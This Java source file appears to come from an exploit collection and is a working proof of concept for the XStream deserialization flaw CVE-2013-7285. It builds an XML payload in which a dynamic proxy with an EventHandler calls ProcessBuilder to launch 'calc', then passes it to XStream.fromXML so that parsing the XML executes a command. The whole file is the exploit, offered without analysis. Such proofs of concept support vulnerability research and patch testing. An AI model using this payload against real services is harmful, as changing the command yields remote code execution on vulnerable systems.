package org.exploit.third.XStream;

import com.thoughtworks.xstream.XStream;

import java.util.HashMap;
import java.util.Map;

//CVE_2013_7285
//XStream version <= 1.4.6 & XStream version = 1.4.10
public class EventHandler {
    public static void main(String[] args) throws Exception{
        String payload = "<tree-map>\n" +
                "    <entry>\n" +
                "\t<dynamic-proxy>\n" +
                "        <interface>java.lang.Comparable</interface>\n" +
                "        <handler class=\"java.beans.EventHandler\">\n" +
                "            <target class=\"java.lang.ProcessBuilder\">\n" +
                "                <command>\n" +
                "                    <string>calc</string>\n" +
                "                </command>\n" +
                "            </target>\n" +
                "            <action>start</action>\n" +
                "        </handler>\n" +
                "    </dynamic-proxy>\n" +
                "    <string>godown</string>\n" +
                "    </entry>\n" +
                "</tree-map>";
        XStream xStream = new XStream();
        xStream.fromXML(payload);
    }
}
